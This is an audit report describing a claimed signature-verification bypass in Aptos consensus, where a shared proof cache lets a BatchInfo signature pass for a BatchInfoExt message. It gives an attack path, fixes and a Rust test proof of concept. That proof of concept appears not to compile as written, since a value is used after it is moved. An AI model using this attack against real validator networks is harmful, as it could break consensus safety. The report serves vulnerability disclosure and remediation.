# Audit Report

## Title
Cache Key Collision Vulnerability in ProofOfStore Verification Allows Signature Verification Bypass

## Summary
The `ProofOfStore::verify()` function uses a shared cache keyed by `BatchInfoExt`, but performs signature verification over different types (`BatchInfo` or `BatchInfoExt`) that use distinct cryptographic hash seeds. This allows an attacker to bypass signature verification by exploiting cache collisions between `ProofOfStoreMsg<BatchInfo>` and `ProofOfStoreMsgV2<BatchInfoExt>` with identical underlying data but cryptographically different hash domains.

## Finding Description

The vulnerability exists in the interaction between the `ProofOfStore::verify()` caching logic and the CryptoHasher domain separation system. [1](#0-0) 

The `verify()` function converts `self.info` to `BatchInfoExt` for cache lookup, but verifies the signature over the original `self.info` type. The critical issue is that `BatchInfo` and `BatchInfoExt` have different CryptoHasher seeds: [2](#0-1) 

The `signing_message()` function prepends the type-specific CryptoHasher seed before BCS serialization: [3](#0-2) 

This means a BLS signature valid for `BatchInfo` is **not** valid for `BatchInfoExt::V1` containing the same underlying data, because they hash to different values due to different seeds.

Both message types share the same `ProofCache`: [4](#0-3) 

**Attack Path:**

1. Attacker monitors the network and observes a valid `ProofOfStoreMsg<BatchInfo>` with info=A and signature=S broadcast by honest validators
2. Victim node receives and verifies it:
   - Converts `BatchInfo A` → `BatchInfoExt::V1(A)` for caching
   - Calls `validator.verify_multi_signatures(&A, &S)` which uses `BatchInfoHasher::seed()`
   - Verification succeeds, caches `V1(A) → S`
3. Attacker crafts malicious `ProofOfStoreMsgV2<BatchInfoExt>` with info=`BatchInfoExt::V1(A)` and signature=S
4. Victim node processes it:
   - `V1(A)` stays as `V1(A)` (identity conversion)
   - Cache lookup finds `V1(A) → S`
   - Signature matches, returns `Ok()` **without verification**
5. Signature S was **never** verified over `BatchInfoExt::V1(A)` using `BatchInfoExtHasher::seed()`

The signature verification is skipped even though S is cryptographically invalid for `BatchInfoExt::V1(A)`. [5](#0-4) 

## Impact Explanation

This is a **Critical Severity** vulnerability under Aptos bug bounty criteria because it enables **Consensus Safety violations**.

An attacker can inject invalid proofs into the consensus protocol that bypass cryptographic verification. This breaks the fundamental security guarantee that all proofs are validated under the correct cryptographic domain. The impact includes:

1. **Consensus Safety Violation**: Different validators may accept different sets of proofs, leading to state divergence and potential chain splits
2. **Byzantine Fault Tolerance Compromise**: The system's BFT guarantees are violated as invalid proofs can be accepted without proper verification
3. **Deterministic Execution Break**: Validators processing messages in different orders (v1 vs v2) will reach different states

The vulnerability affects all validators processing both `ProofOfStoreMsg` and `ProofOfStoreMsgV2` messages, which is the entire network during protocol upgrades or when both versions are in use.

## Likelihood Explanation

**High Likelihood** - The attack is practical and requires:

1. **No privileged access**: Any network peer can broadcast messages
2. **Low complexity**: Attacker only needs to observe legitimate messages and rebroadcast with type conversion
3. **Active exploitation window**: During any period where both v1 and v2 messages are accepted (protocol upgrades, backward compatibility)
4. **Deterministic success**: Cache behavior is deterministic; if the v1 message is processed first, the attack succeeds

The attack requires no computational resources beyond observing network traffic and rebroadcasting messages. The shared cache across message versions creates a reliable exploit path.

## Recommendation

**Fix 1: Include Type Information in Cache Key**

Modify the cache key to include the original type being verified:

```rust
pub type ProofCache = Cache<(BatchInfoExt, TypeId), AggregateSignature>;

pub fn verify(&self, validator: &ValidatorVerifier, cache: &ProofCache) -> anyhow::Result<()> {
    let batch_info_ext: BatchInfoExt = self.info.clone().into();
    let type_id = TypeId::of::<T>();
    
    if let Some(signature) = cache.get(&(batch_info_ext.clone(), type_id)) {
        if signature == self.multi_signature {
            return Ok(());
        }
    }
    
    let result = validator
        .verify_multi_signatures(&self.info, &self.multi_signature)
        .context(format!("Failed to verify ProofOfStore for batch: {:?}", self.info));
        
    if result.is_ok() {
        cache.insert((batch_info_ext, type_id), self.multi_signature.clone());
    }
    result
}
```

**Fix 2: Separate Caches (Simpler)**

Use separate caches for each message type to prevent cross-contamination:

```rust
pub type ProofCacheV1 = Cache<BatchInfoExt, AggregateSignature>;
pub type ProofCacheV2 = Cache<BatchInfoExt, AggregateSignature>;
```

**Fix 3: Remove Caching for Mixed Types**

Only cache when the type being verified matches the cache key type (BatchInfoExt):

```rust
pub fn verify(&self, validator: &ValidatorVerifier, cache: &ProofCache) -> anyhow::Result<()> {
    let batch_info_ext: BatchInfoExt = self.info.clone().into();
    
    // Only use cache if self.info is already BatchInfoExt
    if TypeId::of::<T>() == TypeId::of::<BatchInfoExt>() {
        if let Some(signature) = cache.get(&batch_info_ext) {
            if signature == self.multi_signature {
                return Ok(());
            }
        }
    }
    
    let result = validator.verify_multi_signatures(&self.info, &self.multi_signature)?;
    
    if TypeId::of::<T>() == TypeId::of::<BatchInfoExt>() {
        cache.insert(batch_info_ext, self.multi_signature.clone());
    }
    
    Ok(())
}
```

## Proof of Concept

```rust
#[cfg(test)]
mod cache_collision_exploit {
    use super::*;
    use aptos_crypto::{bls12381, hash::CryptoHash, HashValue};
    use aptos_types::{
        aggregate_signature::AggregateSignature,
        validator_verifier::ValidatorVerifier,
        PeerId,
    };

    #[test]
    fn test_cache_collision_attack() {
        // Setup validator verifier and proof cache
        let (signers, validator_verifier) = 
            aptos_types::validator_verifier::random_validator_verifier(3, None, false);
        let proof_cache = ProofCache::new(100);
        
        // Step 1: Create a valid BatchInfo and sign it
        let batch_info = BatchInfo::new(
            signers[0].author(),
            BatchId::new(0),
            1, // epoch
            1000000, // expiration
            HashValue::random(),
            10, // num_txns
            1000, // num_bytes
            0, // gas_bucket_start
        );
        
        // Create aggregate signature for BatchInfo (valid)
        let signatures: Vec<bls12381::Signature> = signers
            .iter()
            .map(|signer| signer.sign(&batch_info).unwrap())
            .collect();
        let agg_sig = AggregateSignature::new(
            bitvec![u8, bitvec::order::Lsb0; 1, 1, 1],
            Some(bls12381::Signature::aggregate(signatures).unwrap()),
        );
        
        // Step 2: Create ProofOfStore<BatchInfo> and verify (populates cache)
        let proof_v1 = ProofOfStore::new(batch_info.clone(), agg_sig.clone());
        assert!(proof_v1.verify(&validator_verifier, &proof_cache).is_ok());
        
        // Step 3: Create ProofOfStore<BatchInfoExt> with SAME signature
        // This signature is NOT valid for BatchInfoExt due to different CryptoHasher seed
        let batch_info_ext = BatchInfoExt::V1 { info: batch_info };
        let proof_v2 = ProofOfStore::new(batch_info_ext.clone(), agg_sig.clone());
        
        // Step 4: Verify the hash domains are actually different
        let hash_v1 = batch_info.hash();
        let hash_v2 = batch_info_ext.hash();
        assert_ne!(hash_v1, hash_v2, "Hashes should differ due to different seeds");
        
        // Step 5: The verification succeeds due to cache hit, even though signature is invalid!
        // This demonstrates the vulnerability
        let result = proof_v2.verify(&validator_verifier, &proof_cache);
        
        // This should fail but succeeds due to cache collision
        assert!(result.is_ok(), "Vulnerability: Invalid signature accepted via cache!");
        
        // Step 6: Verify that without cache, it would fail
        let fresh_cache = ProofCache::new(100);
        let result_fresh = proof_v2.verify(&validator_verifier, &fresh_cache);
        assert!(result_fresh.is_err(), "Without cache, verification correctly fails");
    }
}
```

## Notes

This vulnerability demonstrates a critical failure in the domain separation between protocol versions. The use of a shared cache across types with different CryptoHasher seeds creates a bypass that undermines the entire signature verification scheme. The issue is exacerbated during protocol upgrades when both message versions coexist in the network.

### Citations

**File:** consensus/consensus-types/src/proof_of_store.rs (L635-652)
```rust
    pub fn verify(&self, validator: &ValidatorVerifier, cache: &ProofCache) -> anyhow::Result<()> {
        let batch_info_ext: BatchInfoExt = self.info.clone().into();
        if let Some(signature) = cache.get(&batch_info_ext) {
            if signature == self.multi_signature {
                return Ok(());
            }
        }
        let result = validator
            .verify_multi_signatures(&self.info, &self.multi_signature)
            .context(format!(
                "Failed to verify ProofOfStore for batch: {:?}",
                self.info
            ));
        if result.is_ok() {
            cache.insert(batch_info_ext, self.multi_signature.clone());
        }
        result
    }
```

**File:** crates/aptos-crypto-derive/src/lib.rs (L388-392)
```rust
                let name = aptos_crypto::_serde_name::trace_name::<#type_name #param>()
                    .expect("The `CryptoHasher` macro only applies to structs and enums");
                #hasher_name(
                    aptos_crypto::hash::DefaultHasher::new(&name.as_bytes()))
            }
```

**File:** crates/aptos-crypto/src/traits/mod.rs (L170-177)
```rust
pub fn signing_message<T: CryptoHash + Serialize>(
    message: &T,
) -> Result<Vec<u8>, CryptoMaterialError> {
    let mut bytes = <T::Hasher as CryptoHasher>::seed().to_vec();
    bcs::serialize_into(&mut bytes, &message)
        .map_err(|_| CryptoMaterialError::SerializationError)?;
    Ok(bytes)
}
```

**File:** consensus/src/round_manager.rs (L212-228)
```rust
            UnverifiedEvent::ProofOfStoreMsg(p) => {
                if !self_message {
                    p.verify(max_num_batches, validator, proof_cache)?;
                    counters::VERIFY_MSG
                        .with_label_values(&["proof_of_store"])
                        .observe(start_time.elapsed().as_secs_f64());
                }
                VerifiedEvent::ProofOfStoreMsg(Box::new((*p).into()))
            },
            UnverifiedEvent::ProofOfStoreMsgV2(p) => {
                if !self_message {
                    p.verify(max_num_batches, validator, proof_cache)?;
                    counters::VERIFY_MSG
                        .with_label_values(&["proof_of_store_v2"])
                        .observe(start_time.elapsed().as_secs_f64());
                }
                VerifiedEvent::ProofOfStoreMsg(p)
```

**File:** crates/aptos-crypto/src/bls12381/bls12381_sigs.rs (L141-143)
```rust
    fn verify<T: CryptoHash + Serialize>(&self, message: &T, public_key: &PublicKey) -> Result<()> {
        self.verify_arbitrary_msg(&signing_message(message)?, public_key)
    }
```
